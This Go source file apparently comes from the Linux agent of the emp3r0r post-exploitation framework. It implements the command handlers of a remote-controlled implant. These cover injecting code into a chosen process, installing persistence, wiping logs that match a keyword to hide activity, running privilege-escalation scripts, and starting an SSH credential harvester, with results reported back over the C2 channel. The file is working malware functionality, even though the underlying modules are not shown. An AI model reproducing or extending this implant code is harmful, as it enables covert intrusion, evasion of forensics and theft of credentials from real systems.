//go:build linux
// +build linux

package handler

import (
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"strconv"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
	"github.com/spf13/cobra"
)

// runInjectLinux implements: !inject --method <method> --pid <pid> --checksum <checksum>
func runInjectLinux(cmd *cobra.Command, args []string) {
	method, _ := cmd.Flags().GetString("method")
	pid, _ := cmd.Flags().GetString("pid")
	checksum, _ := cmd.Flags().GetString("checksum")
	if method == "" || pid == "" || checksum == "" {
		c2transport.C2RespPrintf(cmd, "%s", "Error: args error")
		return
	}
	pidInt, err := strconv.ParseInt(pid, 10, 32)
	if err != nil {
		log.Println("Invalid pid")
		c2transport.C2RespPrintf(cmd, "%s", "Error: invalid pid")
		return
	}
	err = modules.InjectorHandler(int(pidInt), method, checksum)
	if err != nil {
		c2transport.C2RespPrintf(cmd, "%s", "Error: "+err.Error())
		return
	}
	c2transport.C2RespPrintf(cmd, "%s", method+": success")
}

// runPersistenceLinux implements: !persistence --method <method>
func runPersistenceLinux(cmd *cobra.Command, _ []string) {
	method, _ := cmd.Flags().GetString("method")
	if method == "" {
		c2transport.C2RespPrintf(cmd, "%s", "Error: args error")
		return
	}
	if method == "all" {
		err := modules.PersistAllInOne()
		if err != nil {
			log.Println(err)
			c2transport.C2RespPrintf(cmd, "%s", "Some has failed: "+err.Error())
		} else {
			c2transport.C2RespPrintf(cmd, "%s", "Success")
		}
		return
	} else {
		if persistMethod, exists := modules.PersistMethods[method]; exists {
			err := persistMethod()
			if err != nil {
				log.Println(err)
				c2transport.C2RespPrintf(cmd, "%s", "Error: "+err.Error())
			} else {
				c2transport.C2RespPrintf(cmd, "%s", "Success")
			}
		} else {
			c2transport.C2RespPrintf(cmd, "%s", "Error: No such method available")
		}
	}
}

// runGetRootLinux implements: !get_root
func runGetRootLinux(cmd *cobra.Command, args []string) {
	if os.Geteuid() == 0 {
		c2transport.C2RespPrintf(cmd, "%s", "Warning: You already have root!")
	} else {
		c2transport.C2RespPrintf(cmd, "%s", "Deprecated")
	}
}

// runCleanLogLinux implements: !clean_log --keyword <keyword>
func runCleanLogLinux(cmd *cobra.Command, args []string) {
	keyword, _ := cmd.Flags().GetString("keyword")
	if keyword == "" {
		c2transport.C2RespPrintf(cmd, "%s", "Error: args error")
		return
	}
	err := modules.CleanAllByKeyword(keyword)
	if err != nil {
		c2transport.C2RespPrintf(cmd, "%s", err.Error())
		return
	}
	c2transport.C2RespPrintf(cmd, "%s", "Done")
}

// runLPELinux implements: !lpe --script_name <script_name> --checksum <checksum>
func runLPELinux(cmd *cobra.Command, args []string) {
	scriptName, _ := cmd.Flags().GetString("script_name")
	checksum, _ := cmd.Flags().GetString("checksum")
	if scriptName == "" || checksum == "" {
		c2transport.C2RespPrintf(cmd, "%s", "Error: args error")
		return
	}
	out := modules.RunLPEHelper(scriptName, checksum)
	c2transport.C2RespPrintf(cmd, "%s", out)
}

// runSSHHarvesterLinux implements: !ssh_harvester --code_pattern <hex> --reg_name <reg> --stop <bool>
func runSSHHarvesterLinux(cmd *cobra.Command, args []string) {
	codePattern, _ := cmd.Flags().GetString("code_pattern")
	regName, _ := cmd.Flags().GetString("reg_name")
	stop, _ := cmd.Flags().GetBool("stop")
	if stop && modules.SshHarvesterCancel != nil {
		modules.SshHarvesterCancel()
		c2transport.C2RespPrintf(cmd, "%s", "SSH harvester stopped")
		return
	}
	codePatternBytes, err := hex.DecodeString(codePattern)
	if err != nil {
		c2transport.C2RespPrintf(cmd, "%s", fmt.Sprintf("Error parsing hex string: %v", err))
		return
	}
	if modules.SshHarvesterRunning {
		c2transport.C2RespPrintf(cmd, "%s", "SSH harvester is already running")
	} else {
		go modules.SshHarvester(cmd, codePatternBytes, regName)
	}
}
